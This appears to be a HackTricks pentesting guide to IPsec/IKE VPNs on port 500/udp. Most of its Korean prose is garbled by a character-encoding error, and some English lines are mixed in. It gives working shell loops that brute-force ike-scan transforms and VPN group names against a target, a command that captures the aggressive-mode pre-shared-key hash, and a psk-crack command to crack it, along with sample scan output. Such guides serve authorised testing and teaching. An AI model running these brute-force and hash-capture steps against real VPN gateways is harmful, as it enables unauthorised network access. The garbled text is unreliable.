# 500/udp - IPsec/IKE VPN íœí…ŒìŠ¤íŒ…

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
{% endhint %}

## ê¸°ë³¸ ì •ë³´

**IPsec**ì€ ë„¤íŠ¸ì›Œí¬ ê°„(LAN-to-LAN) ë° ì›ê²© ì‚¬ìš©ìê°€ ë„¤íŠ¸ì›Œí¬ ê²Œì´íŠ¸ì›¨ì´ì— ì—°ê²°í•˜ëŠ” í†µì‹ ì„ ë³´í˜¸í•˜ëŠ” ì£¼ìš” ê¸°ìˆ ë¡œ ë„ë¦¬ ì¸ì‹ë˜ë©°, ê¸°ì—… VPN ì†”ë£¨ì…˜ì˜ ì¤‘ì¶” ì—­í• ì„ í•©ë‹ˆë‹¤.

ë‘ ì§€ì  ê°„ì˜ **ë³´ì•ˆ í˜‘ì •(SA)** ìˆ˜ë¦½ì€ **IKE**ì— ì˜í•´ ê´€ë¦¬ë˜ë©°, ì´ëŠ” ì¸ì¦ ë° í‚¤ êµí™˜ì„ ìœ„í•´ ì„¤ê³„ëœ í”„ë¡œí† ì½œì¸ ISAKMPì˜ ë²”ìœ„ ë‚´ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ ì—¬ëŸ¬ ë‹¨ê³„ë¡œ ì§„í–‰ë©ë‹ˆë‹¤:

* **1ë‹¨ê³„:** ë‘ ì—”ë“œí¬ì¸íŠ¸ ê°„ì— ì•ˆì „í•œ ì±„ë„ì´ ìƒì„±ë©ë‹ˆë‹¤. ì´ëŠ” ì‚¬ì „ ê³µìœ  í‚¤(PSK) ë˜ëŠ” ì¸ì¦ì„œë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ë£¨ì–´ì§€ë©°, ì„¸ ìŒì˜ ë©”ì‹œì§€ë¥¼ í¬í•¨í•˜ëŠ” ë©”ì¸ ëª¨ë“œ ë˜ëŠ” **ê³µê²© ëª¨ë“œ**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **1.5ë‹¨ê³„:** í•„ìˆ˜ëŠ” ì•„ë‹ˆì§€ë§Œ, í™•ì¥ ì¸ì¦ ë‹¨ê³„ë¡œ ì•Œë ¤ì§„ ì´ ë‹¨ê³„ëŠ” ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìš”êµ¬í•˜ì—¬ ì—°ê²°ì„ ì‹œë„í•˜ëŠ” ì‚¬ìš©ìì˜ ì‹ ì›ì„ í™•ì¸í•©ë‹ˆë‹¤.
* **2ë‹¨ê³„:** ì´ ë‹¨ê³„ëŠ” **ESP** ë° **AH**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•œ ë§¤ê°œë³€ìˆ˜ë¥¼ í˜‘ìƒí•˜ëŠ” ë° ì „ë…í•©ë‹ˆë‹¤. ì´ëŠ” **ì™„ë²½í•œ ì „ë°© ë¹„ë°€ì„±(PFS)**ì„ ë³´ì¥í•˜ê¸° ìœ„í•´ 1ë‹¨ê³„ì™€ ë‹¤ë¥¸ ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ë³´ì•ˆì„ ê°•í™”í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 500/udp

## **nmap**ì„ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ ë°œê²¬í•˜ê¸°
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **ìœ íš¨í•œ ë³€í™˜ ì°¾ê¸°**

IPSec êµ¬ì„±ì€ í•˜ë‚˜ ë˜ëŠ” ëª‡ ê°€ì§€ ë³€í™˜ë§Œ ìˆ˜ë½í•˜ë„ë¡ ì¤€ë¹„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³€í™˜ì€ ê°’ì˜ ì¡°í•©ì…ë‹ˆë‹¤. **ê° ë³€í™˜**ì€ DES ë˜ëŠ” 3DESì™€ ê°™ì€ **ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜**, SHA ë˜ëŠ” MD5ì™€ ê°™ì€ **ë¬´ê²°ì„± ì•Œê³ ë¦¬ì¦˜**, ì‚¬ì „ ê³µìœ  í‚¤ì™€ ê°™ì€ **ì¸ì¦ ìœ í˜•**, Diffie-Hellman 1 ë˜ëŠ” 2ì™€ ê°™ì€ í‚¤ **ë°°í¬ ì•Œê³ ë¦¬ì¦˜**, ê·¸ë¦¬ê³  28800ì´ˆì™€ ê°™ì€ **ìˆ˜ëª…**ì„ í¬í•¨í•˜ëŠ” ì—¬ëŸ¬ ì†ì„±ì„ í¬í•¨í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ì„œë²„ê°€ ë‹¹ì‹ ê³¼ í†µì‹ í•  ìˆ˜ ìˆë„ë¡ **ìœ íš¨í•œ ë³€í™˜ì„ ì°¾ëŠ” ê²ƒ**ì´ ì²« ë²ˆì§¸ ì‘ì—…ì…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **ike-scan** ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ Ike-scanì€ ë©”ì¸ ëª¨ë“œì—ì„œ ì‘ë™í•˜ë©°, ISAKMP í—¤ë”ì™€ **ì—¬ëŸ ê°œì˜ ë³€í™˜ì´ í¬í•¨ëœ** ë‹¨ì¼ ì œì•ˆìœ¼ë¡œ ê²Œì´íŠ¸ì›¨ì´ì— íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.

ì‘ë‹µì— ë”°ë¼ ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
As you can see in the previous response, there is a field called **AUTH** with the value **PSK**. This means that the vpn is configured using a preshared key (and this is really good for a pentester).\
**The value of the last line is also very important:**

* _0 returned handshake; 0 returned notify:_ ì´ê²ƒì€ ëŒ€ìƒì´ **IPsec ê²Œì´íŠ¸ì›¨ì´ê°€ ì•„ë‹˜**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
* _**1 returned handshake; 0 returned notify:**_ ì´ê²ƒì€ **ëŒ€ìƒì´ IPsecì— ëŒ€í•´ êµ¬ì„±ë˜ì–´ ìˆìœ¼ë©° IKE í˜‘ìƒì„ ìˆ˜í–‰í•  ì˜ì‚¬ê°€ ìˆìœ¼ë©°, ì œì•ˆí•œ ë³€í™˜ ì¤‘ í•˜ë‚˜ ì´ìƒì´ í—ˆìš©ë¨**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤ (ìœ íš¨í•œ ë³€í™˜ì€ ì¶œë ¥ì— í‘œì‹œë©ë‹ˆë‹¤).
* _0 returned handshake; 1 returned notify:_ VPN ê²Œì´íŠ¸ì›¨ì´ëŠ” **í—ˆìš© ê°€ëŠ¥í•œ ë³€í™˜ì´ ì—†ì„ ë•Œ** ì•Œë¦¼ ë©”ì‹œì§€ë¡œ ì‘ë‹µí•©ë‹ˆë‹¤ (ì¼ë¶€ ê²Œì´íŠ¸ì›¨ì´ëŠ” ê·¸ë ‡ì§€ ì•Šìœ¼ë©°, ì´ ê²½ìš° ì¶”ê°€ ë¶„ì„ê³¼ ìˆ˜ì •ëœ ì œì•ˆì´ í•„ìš”í•©ë‹ˆë‹¤).

Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to **brute-force a little bit to find a valid transformation:**

First of all you need to create all the possible transformations:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
ê·¸ë¦¬ê³  ê° í•­ëª©ì„ ike-scanì„ ì‚¬ìš©í•˜ì—¬ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤(ì´ ê³¼ì •ì€ ëª‡ ë¶„ì´ ê±¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
ë§Œì•½ brute-forceê°€ ì‘ë™í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´, ì„œë²„ê°€ ìœ íš¨í•œ ë³€í™˜ì— ëŒ€í•´ì„œë„ í•¸ë“œì…°ì´í¬ ì—†ì´ ì‘ë‹µí•˜ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¼, ê³µê²© ëª¨ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ê°™ì€ brute-forceë¥¼ ì‹œë„í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
í¬ë§ì ìœ¼ë¡œ **ìœ íš¨í•œ ë³€í™˜ì´ ì—ì½”ë°±ë©ë‹ˆë‹¤**.\
[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ **ê°™ì€ ê³µê²©**ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
[**ikeforce**](https://github.com/SpiderLabs/ikeforce)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³€í™˜ì„ ë¬´ì‘ìœ„ë¡œ ì‹œë„í•´ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

**DH ê·¸ë£¹: 14 = 2048ë¹„íŠ¸ MODP** ë° **15 = 3072ë¹„íŠ¸**\
**2 = HMAC-SHA = SHA1 (ì´ ê²½ìš°). `--trans` í˜•ì‹ì€ $Enc,$Hash,$Auth,$DH**ì…ë‹ˆë‹¤.

CiscoëŠ” DH ê·¸ë£¹ 1ê³¼ 2ëŠ” ì¶©ë¶„íˆ ê°•ë ¥í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì‚¬ìš©ì„ í”¼í•˜ë¼ê³  ê¶Œì¥í•©ë‹ˆë‹¤. ì „ë¬¸ê°€ë“¤ì€ **ìì›ì´ ë§ì€ êµ­ê°€ë“¤ì´ ì´ëŸ¬í•œ ì•½í•œ ê·¸ë£¹ì„ ì‚¬ìš©í•˜ëŠ” ë°ì´í„°ì˜ ì•”í˜¸ë¥¼ ì‰½ê²Œ í•´ë…í•  ìˆ˜ ìˆë‹¤ê³  ë¯¿ìŠµë‹ˆë‹¤.** ì´ëŠ” ê·¸ë“¤ì´ ì½”ë“œë¥¼ ë¹ ë¥´ê²Œ í•´ë…í•  ìˆ˜ ìˆë„ë¡ ì¤€ë¹„í•˜ëŠ” íŠ¹ë³„í•œ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì´ ë°©ë²•ì„ ì„¤ì •í•˜ëŠ” ë° ë§ì€ ë¹„ìš©ì´ ë“¤ì§€ë§Œ, ì´ëŸ¬í•œ ê°•ë ¥í•œ êµ­ê°€ë“¤ì€ ì•½í•œ ê·¸ë£¹(ì˜ˆ: 1,024ë¹„íŠ¸ ì´í•˜)ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ì•”í˜¸í™”ëœ ë°ì´í„°ë¥¼ ì‹¤ì‹œê°„ìœ¼ë¡œ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì„œë²„ ì§€ë¬¸ ì¸ì‹

ê·¸ëŸ° ë‹¤ìŒ, ike-scanì„ ì‚¬ìš©í•˜ì—¬ **ì¥ì¹˜ì˜ ê³µê¸‰ì—…ì²´ë¥¼ ë°œê²¬**í•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ì´ˆê¸° ì œì•ˆì„ ë³´ë‚´ê³  ì¬ì „ì†¡ì„ ì¤‘ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ìˆ˜ì‹ ëœ **ë©”ì‹œì§€**ì™€ ì¼ì¹˜í•˜ëŠ” ì‘ë‹µ íŒ¨í„´ ê°„ì˜ **ì‹œê°„** ì°¨ì´ë¥¼ **ë¶„ì„**í•˜ì—¬, íœí…ŒìŠ¤í„°ëŠ” VPN ê²Œì´íŠ¸ì›¨ì´ ê³µê¸‰ì—…ì²´ë¥¼ ì„±ê³µì ìœ¼ë¡œ ì§€ë¬¸ ì¸ì‹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€, ì¼ë¶€ VPN ì„œë²„ëŠ” IKEì™€ í•¨ê»˜ ì„ íƒì  **ê³µê¸‰ì—…ì²´ ID (VID) í˜ì´ë¡œë“œ**ë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.

**í•„ìš”í•œ ê²½ìš° ìœ íš¨í•œ ë³€í™˜ì„ ì§€ì •í•˜ì‹­ì‹œì˜¤** (using --trans)

IKEê°€ ê³µê¸‰ì—…ì²´ë¥¼ ë°œê²¬í•˜ë©´ ì´ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
This can be also achieve with nmap script _**ike-version**_

## ì˜¬ë°”ë¥¸ ID (ê·¸ë£¹ ì´ë¦„) ì°¾ê¸°

í•´ì‹œë¥¼ ìº¡ì²˜í•˜ë ¤ë©´ ê³µê²© ëª¨ë“œë¥¼ ì§€ì›í•˜ëŠ” ìœ íš¨í•œ ë³€í™˜ê³¼ ì˜¬ë°”ë¥¸ ID (ê·¸ë£¹ ì´ë¦„)ê°€ í•„ìš”í•©ë‹ˆë‹¤. ìœ íš¨í•œ ê·¸ë£¹ ì´ë¦„ì„ ëª¨ë¥¼ ê°€ëŠ¥ì„±ì´ ë†’ìœ¼ë¯€ë¡œ ì´ë¥¼ ë¬´ì‘ìœ„ë¡œ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤.\
ì´ë¥¼ ìœ„í•´ ë‘ ê°€ì§€ ë°©ë²•ì„ ì¶”ì²œí•©ë‹ˆë‹¤:

### ike-scanìœ¼ë¡œ ID ë¬´ì‘ìœ„ ëŒ€ì…

ë¨¼ì €, í•´ì‹œë¥¼ ìˆ˜ì§‘í•˜ê¸° ìœ„í•´ ê°€ì§œ IDë¡œ ìš”ì²­ì„ ì‹œë„í•´ ë³´ì‹­ì‹œì˜¤ ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
If **no hash is returned**, then probably this method of brute forcing will work. **If some hash is returned, this means that a fake hash is going to be sent back for a fake ID, so this method won't be reliable** to brute-force the ID. For example, a fake hash could be returned (this happens in modern versions):

![](<../.gitbook/assets/image (917).png>)

í•˜ì§€ë§Œ ì œê°€ ë§í–ˆë“¯ì´, í•´ì‹œê°€ ë°˜í™˜ë˜ì§€ ì•Šìœ¼ë©´, ike-scanì„ ì‚¬ìš©í•˜ì—¬ ì¼ë°˜ ê·¸ë£¹ ì´ë¦„ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•´ ë³´ì•„ì•¼ í•©ë‹ˆë‹¤.

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” **ê°€ëŠ¥í•œ IDë¥¼ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ë ¤ê³  ì‹œë„**í•˜ë©°, ìœ íš¨í•œ í•¸ë“œì…°ì´í¬ê°€ ë°˜í™˜ë˜ëŠ” IDë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤(ì´ê²ƒì´ ìœ íš¨í•œ ê·¸ë£¹ ì´ë¦„ì´ ë©ë‹ˆë‹¤).

íŠ¹ì • ë³€í™˜ì„ ë°œê²¬í–ˆë‹¤ë©´ ike-scan ëª…ë ¹ì— ì¶”ê°€í•˜ì‹­ì‹œì˜¤. ì—¬ëŸ¬ ë³€í™˜ì„ ë°œê²¬í–ˆë‹¤ë©´ ëª¨ë‘ ì‹œë„í•  ìˆ˜ ìˆë„ë¡ ìƒˆë¡œìš´ ë£¨í”„ë¥¼ ì¶”ê°€í•˜ì‹­ì‹œì˜¤(ì‘ë™í•˜ëŠ” ê²ƒì´ ë‚˜ì˜¬ ë•Œê¹Œì§€ ëª¨ë‘ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤).

ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ê¸° ìœ„í•´ ì¼ë°˜ ê·¸ë£¹ ì´ë¦„ì˜ [ikeforce ì‚¬ì „](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ë˜ëŠ” [seclistsì˜ ì‚¬ì „](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt)ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Ikerë¡œ ID ë¸Œë£¨íŠ¸í¬ìŠ¤

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ë˜í•œ **ike-scan**ì„ ì‚¬ìš©í•˜ì—¬ ê°€ëŠ¥í•œ ê·¸ë£¹ ì´ë¦„ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤í•©ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” **ike-scanì˜ ì¶œë ¥ì— ê¸°ë°˜í•˜ì—¬ ìœ íš¨í•œ IDë¥¼ ì°¾ëŠ”** ìì²´ ë°©ë²•ì„ ë”°ë¦…ë‹ˆë‹¤.

### ikeforceë¡œ ID ë¸Œë£¨íŠ¸í¬ìŠ¤

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce)ëŠ” **IDë¥¼ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬**ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” **ìœ íš¨í•œ IDì™€ ë¹„ìœ íš¨í•œ IDë¥¼ êµ¬ë³„í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤** (ê±°ì§“ ê¸ì • ë° ê±°ì§“ ë¶€ì •ì´ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê°€ëŠ¥í•˜ë©´ ike-scan ë°©ë²•ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì„ í˜¸í•©ë‹ˆë‹¤).

ê¸°ë³¸ì ìœ¼ë¡œ **ikeforce**ëŠ” ì„œë²„ì˜ ë™ì‘ì„ í™•ì¸í•˜ê³  ì‚¬ìš©í•  ì „ìˆ ì„ ê²°ì •í•˜ê¸° ìœ„í•´ ì²˜ìŒì— ëª‡ ê°œì˜ ë¬´ì‘ìœ„ IDë¥¼ ë³´ëƒ…ë‹ˆë‹¤.

* **ì²« ë²ˆì§¸ ë°©ë²•**ì€ **Dead Peer Detection DPD**ì— ëŒ€í•œ ì •ë³´ë¥¼ **ê²€ìƒ‰**í•˜ì—¬ ê·¸ë£¹ ì´ë¦„ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤ (ì´ ì •ë³´ëŠ” ê·¸ë£¹ ì´ë¦„ì´ ì˜¬ë°”ë¥¸ ê²½ìš°ì—ë§Œ ì„œë²„ì— ì˜í•´ ì¬ìƒë©ë‹ˆë‹¤).
* **ë‘ ë²ˆì§¸ ë°©ë²•**ì€ **ê° ì‹œë„ì— ëŒ€í•´ ì „ì†¡ëœ ì‘ë‹µ ìˆ˜ë¥¼ í™•ì¸í•˜ëŠ”** ê²ƒì…ë‹ˆë‹¤. ë•Œë•Œë¡œ ì˜¬ë°”ë¥¸ IDê°€ ì‚¬ìš©ë  ë•Œ ë” ë§ì€ íŒ¨í‚·ì´ ì „ì†¡ë©ë‹ˆë‹¤.
* **ì„¸ ë²ˆì§¸ ë°©ë²•**ì€ **ì˜ëª»ëœ IDì— ëŒ€í•œ ì‘ë‹µì—ì„œ "INVALID-ID-INFORMATION"ì„ ê²€ìƒ‰í•˜ëŠ”** ê²ƒì…ë‹ˆë‹¤.
* ë§ˆì§€ë§‰ìœ¼ë¡œ, ì„œë²„ê°€ ì²´í¬ì— ëŒ€í•´ ì•„ë¬´ê²ƒë„ ì¬ìƒí•˜ì§€ ì•Šìœ¼ë©´, **ikeforce**ëŠ” ì„œë²„ë¥¼ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ì—¬ ì˜¬ë°”ë¥¸ IDê°€ ì „ì†¡ë  ë•Œ ì„œë²„ê°€ íŒ¨í‚·ìœ¼ë¡œ ì‘ë‹µí•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.\
ëª…ë°±íˆ, IDë¥¼ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ëŠ” ëª©í‘œëŠ” ìœ íš¨í•œ IDë¥¼ ê°€ì§ˆ ë•Œ **PSK**ë¥¼ ì–»ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **ID**ì™€ **PSK**ë¡œ XAUTHë¥¼ ë¸Œë£¨íŠ¸í¬ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤ (XAUTHê°€ í™œì„±í™”ëœ ê²½ìš°).

íŠ¹ì • ë³€í™˜ì„ ë°œê²¬í•œ ê²½ìš° ikeforce ëª…ë ¹ì— ì¶”ê°€í•˜ì‹­ì‹œì˜¤. ì—¬ëŸ¬ ë³€í™˜ì„ ë°œê²¬í•œ ê²½ìš° ëª¨ë‘ ì‹œë„í•  ìˆ˜ ìˆë„ë¡ ìƒˆë¡œìš´ ë£¨í”„ë¥¼ ì¶”ê°€í•´ë„ ì¢‹ìŠµë‹ˆë‹¤ (ì‘ë™í•˜ëŠ” ë³€í™˜ì´ ë‚˜ì˜¬ ë•Œê¹Œì§€ ëª¨ë‘ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): VPN í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ê°„ì˜ ì—°ê²°ì„ ìŠ¤ë‹ˆí•‘í•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ì ì´ë¦„ì„ ì–»ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ IDë¥¼ í¬í•¨í•˜ëŠ” ì²« ë²ˆì§¸ ê³µê²© ëª¨ë“œ íŒ¨í‚·ì´ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

ë§ˆì§€ë§‰ìœ¼ë¡œ, **ìœ íš¨í•œ ë³€í™˜**ê³¼ **ê·¸ë£¹ ì´ë¦„**ì„ ì°¾ì•˜ê³  **ê³µê²© ëª¨ë“œê°€ í—ˆìš©ëœë‹¤ë©´**, í¬ë™ ê°€ëŠ¥í•œ í•´ì‹œë¥¼ ë§¤ìš° ì‰½ê²Œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
í•´ì‹œëŠ” _hash.txt_ ì•ˆì— ì €ì¥ë©ë‹ˆë‹¤.

**psk-crack**, **john** ([**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) ì‚¬ìš©) ë° **hashcat**ì„ ì‚¬ìš©í•˜ì—¬ í•´ì‹œë¥¼ **í¬ë™**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**ê³µê²© ëª¨ë“œ IKE**ëŠ” **ì‚¬ì „ ê³µìœ  í‚¤(PSK)**ì™€ ê²°í•©ë˜ì–´ **ê·¸ë£¹ ì¸ì¦** ëª©ì ìœ¼ë¡œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ **XAuth (í™•ì¥ ì¸ì¦)**ì— ì˜í•´ ë³´ê°•ë˜ì–´ ì¶”ê°€ì ì¸ **ì‚¬ìš©ì ì¸ì¦** ê³„ì¸µì„ ë„ì…í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¸ì¦ì€ ì¼ë°˜ì ìœ¼ë¡œ **Microsoft Active Directory**, **RADIUS** ë˜ëŠ” ìœ ì‚¬í•œ ì‹œìŠ¤í…œê³¼ ê°™ì€ ì„œë¹„ìŠ¤ë¥¼ í™œìš©í•©ë‹ˆë‹¤.

